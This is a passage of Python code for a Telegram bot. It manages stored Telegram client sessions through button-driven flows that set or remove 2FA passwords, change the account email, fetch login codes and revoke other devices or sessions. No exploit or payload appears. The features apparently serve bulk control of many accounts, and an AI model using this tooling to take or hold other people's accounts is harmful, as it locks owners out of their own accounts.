    context.user_data["fo_2fa_client_key"] = f"detail_client_{account_id}"
    context.user_data["fo_2fa_mode"] = "set"

    status = await get_2fa_status(client)
    if status.get("enabled"):
        prompt = (
            "🔐 **Set / Change 2FA**\n\n"
            "This account already has 2FA.\n"
            "Send in this format:\n"
            "`currentpassword|newpassword`\n\n"
            "Example: `oldpass123|newpass456`"
        )
    else:
        prompt = (
            "🔐 **Set 2FA**\n\n"
            "This account has no 2FA yet.\n"
            "Send the **new password** you want to set (min 4 characters)."
        )

    await safe_edit(query, prompt, parse_mode="Markdown", reply_markup=cancel_kb("fo_2fa"))
    return FO_WAITING_2FA_SET


async def fo_ask_2fa_remove(update, context, account_id: str, client):
    """Ask for current password to remove 2FA."""
    query = update.callback_query
    context.user_data["fo_2fa_account_id"] = account_id
    context.user_data["fo_2fa_client_key"] = f"detail_client_{account_id}"
    context.user_data["fo_2fa_mode"] = "remove"

    status = await get_2fa_status(client)
    if not status.get("enabled"):
        await safe_edit(
            query,
            "ℹ️ **2FA is not enabled** on this account. Nothing to remove.",
            parse_mode="Markdown",
            reply_markup=fo_twofa_kb(account_id),
        )
        return ACCOUNT_DETAIL

    await safe_edit(
        query,
        "🗑️ **Remove 2FA**\n\n"
        "Send the **current 2FA password** to remove it.",
        parse_mode="Markdown",
        reply_markup=cancel_kb("fo_2fa"),
    )
    return FO_WAITING_2FA_REMOVE


async def fo_receive_2fa_set(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive password(s) and set/change 2FA."""
    text_in = (update.message.text or "").strip()
    account_id = context.user_data.get("fo_2fa_account_id")
    client_key = context.user_data.get("fo_2fa_client_key")
    client = context.user_data.get(client_key) if client_key else None

    if not account_id or not client or not client.is_connected():
        await update.message.reply_text("❌ Session lost. Open Full Operations again.")
        return ConversationHandler.END

    current = None
    new_pwd = text_in
    if "|" in text_in:
        parts = text_in.split("|", 1)
        current = parts[0].strip()
        new_pwd = parts[1].strip()

    if not new_pwd or len(new_pwd) < 4:
        await update.message.reply_text(
            "❌ Password too short (min 4 chars). Try again.",
            reply_markup=cancel_kb("fo_2fa"),
        )
        return FO_WAITING_2FA_SET

    ok, msg = await set_2fa_password(client, new_pwd, current_password=current)
    for k in ("fo_2fa_account_id", "fo_2fa_client_key"):
        context.user_data.pop(k, None)

    if ok:
        await update.message.reply_text(
            f"✅ {msg}",
            reply_markup=full_operations_kb(account_id),
        )
        return ACCOUNT_DETAIL

    await update.message.reply_text(
        f"❌ {msg}\n\nTry again or cancel.",
        reply_markup=cancel_kb("fo_2fa"),
    )
    # Put flags back so user can retry
    context.user_data["fo_2fa_account_id"] = account_id
    context.user_data["fo_2fa_client_key"] = client_key
    return FO_WAITING_2FA_SET


async def fo_receive_2fa_remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive current password and remove 2FA."""
    current = (update.message.text or "").strip()
    account_id = context.user_data.get("fo_2fa_account_id")
    client_key = context.user_data.get("fo_2fa_client_key")
    client = context.user_data.get(client_key) if client_key else None

    if not account_id or not client or not client.is_connected():
        await update.message.reply_text("❌ Session lost. Open Full Operations again.")
        return ConversationHandler.END

    if not current:
        await update.message.reply_text(
            "❌ Please send the current 2FA password.",
            reply_markup=cancel_kb("fo_2fa"),
        )
        return FO_WAITING_2FA_REMOVE

    ok, msg = await remove_2fa_password(client, current)
    for k in ("fo_2fa_account_id", "fo_2fa_client_key"):
        context.user_data.pop(k, None)

    if ok:
        await update.message.reply_text(
            f"✅ {msg}",
            reply_markup=full_operations_kb(account_id),
        )
        return ACCOUNT_DETAIL

    await update.message.reply_text(
        f"❌ {msg}\n\nTry again or cancel.",
        reply_markup=cancel_kb("fo_2fa"),
    )
    context.user_data["fo_2fa_account_id"] = account_id
    context.user_data["fo_2fa_client_key"] = client_key
    return FO_WAITING_2FA_REMOVE


async def fo_cancel_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel 2FA flow from Full Ops."""
    query = update.callback_query
    if query:
        await query.answer()
    account_id = context.user_data.pop("fo_2fa_account_id", None)
    context.user_data.pop("fo_2fa_client_key", None)
    context.user_data.pop("fo_2fa_mode", None)

    if account_id and query:
        await safe_edit(
            query,
            "❌ 2FA cancelled.",
            reply_markup=full_operations_kb(account_id),
        )
        return ACCOUNT_DETAIL
    if update.message:
        await update.message.reply_text("❌ 2FA cancelled.", reply_markup=main_menu_kb())
    return ConversationHandler.END


def get_my_accounts_conversation():
    """ConversationHandler so Full Ops Change Mail can wait for email/code."""
    return ConversationHandler(
        entry_points=[
            CallbackQueryHandler(my_accounts_entry, pattern=r"^my_accounts$"),
        ],
        states={
            PAGE_VIEWING: [
                CallbackQueryHandler(accounts_navigation, pattern=r"^acc_page:|^acc_refresh$|^acc_view:"),
                CallbackQueryHandler(back_main_cleanup, pattern=r"^back_main$"),
            ],
            ACCOUNT_DETAIL: [
                CallbackQueryHandler(account_actions, pattern=r"^acc_otp:|^acc_revoke:|^acc_allow:|^acc_guard:"),
                CallbackQueryHandler(full_ops_entry, pattern=r"^acc_fullops:"),
                CallbackQueryHandler(fo_device_action, pattern=r"^fo_dev:|^fo_dev_yes:|^fo_revoke_all:|^fo_revoke_bot:|^fo_revoke_bot_yes:"),
                # Mail auto/manual MUST be registered before the broad ^fo_ handler
                CallbackQueryHandler(fo_run_auto_mail, pattern=r"^fo_mail_auto$"),
                CallbackQueryHandler(fo_start_manual_mail, pattern=r"^fo_mail_manual$"),
                CallbackQueryHandler(full_ops_action, pattern=r"^fo_"),
                CallbackQueryHandler(back_to_accounts, pattern=r"^acc_back$"),
                CallbackQueryHandler(back_main_cleanup, pattern=r"^back_main$"),
                CallbackQueryHandler(accounts_navigation, pattern=r"^acc_view:"),
            ],
            FO_WAITING_EMAIL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, fo_receive_email),
                CallbackQueryHandler(fo_cancel_mail, pattern=r"^cancel_fo_mail$"),
                CallbackQueryHandler(back_main_cleanup, pattern=r"^back_main$"),
            ],
            FO_WAITING_CODE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, fo_receive_code),
                CallbackQueryHandler(fo_cancel_mail, pattern=r"^cancel_fo_mail$"),
                CallbackQueryHandler(back_main_cleanup, pattern=r"^back_main$"),
            ],
            FO_WAITING_2FA_SET: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, fo_receive_2fa_set),
                CallbackQueryHandler(fo_cancel_2fa, pattern=r"^cancel_fo_2fa$"),
                CallbackQueryHandler(back_main_cleanup, pattern=r"^back_main$"),
            ],
            FO_WAITING_2FA_REMOVE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, fo_receive_2fa_remove),
                CallbackQueryHandler(fo_cancel_2fa, pattern=r"^cancel_fo_2fa$"),
                CallbackQueryHandler(back_main_cleanup, pattern=r"^back_main$"),
            ],
        },
        fallbacks=[
            CallbackQueryHandler(back_main_cleanup, pattern=r"^back_main$"),
            CommandHandler("cancel", fo_cancel_mail),
        ],
        name="my_accounts",
        persistent=False,
        allow_reentry=True,
    )


async def _fo_mail_message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Route text messages during Full Ops Change Mail / 2FA even outside ConversationHandler."""
    # Change Mail flow
    if context.user_data.get("fo_change_mail_account_id") and context.user_data.get("fo_pending_email"):
        return await fo_receive_code(update, context)
    if context.user_data.get("fo_change_mail_account_id"):
        return await fo_receive_email(update, context)
    # 2FA flow — distinguish set vs remove via a flag
    if context.user_data.get("fo_2fa_account_id"):
        mode = context.user_data.get("fo_2fa_mode", "set")
        if mode == "remove":
            return await fo_receive_2fa_remove(update, context)
        return await fo_receive_2fa_set(update, context)
    return


def register(application):
    application.add_handler(get_my_accounts_conversation())
    # Global handlers so buttons still work if conversation ended
    application.add_handler(CallbackQueryHandler(my_accounts_entry, pattern=r"^my_accounts$"))
    application.add_handler(CallbackQueryHandler(accounts_navigation, pattern=r"^acc_page:|^acc_refresh$|^acc_view:"))
    application.add_handler(CallbackQueryHandler(account_actions, pattern=r"^acc_otp:|^acc_revoke:|^acc_allow:|^acc_guard:"))
    application.add_handler(CallbackQueryHandler(full_ops_entry, pattern=r"^acc_fullops:"))
    application.add_handler(CallbackQueryHandler(fo_device_action, pattern=r"^fo_dev:|^fo_dev_yes:|^fo_revoke_all:|^fo_revoke_bot:|^fo_revoke_bot_yes:"))
    # Mail auto/manual MUST be registered before the broad ^fo_ handler
    application.add_handler(CallbackQueryHandler(fo_run_auto_mail, pattern=r"^fo_mail_auto$"))
    application.add_handler(CallbackQueryHandler(fo_start_manual_mail, pattern=r"^fo_mail_manual$"))
    application.add_handler(CallbackQueryHandler(full_ops_action, pattern=r"^fo_"))
    application.add_handler(CallbackQueryHandler(back_to_accounts, pattern=r"^acc_back$"))
    application.add_handler(CallbackQueryHandler(fo_cancel_mail, pattern=r"^cancel_fo_mail$"))
    application.add_handler(CallbackQueryHandler(fo_cancel_2fa, pattern=r"^cancel_fo_2fa$"))
    # Catch email/code replies when user is in Full Ops Change Mail flow
    application.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, _fo_mail_message_router),
        group=5,
    )
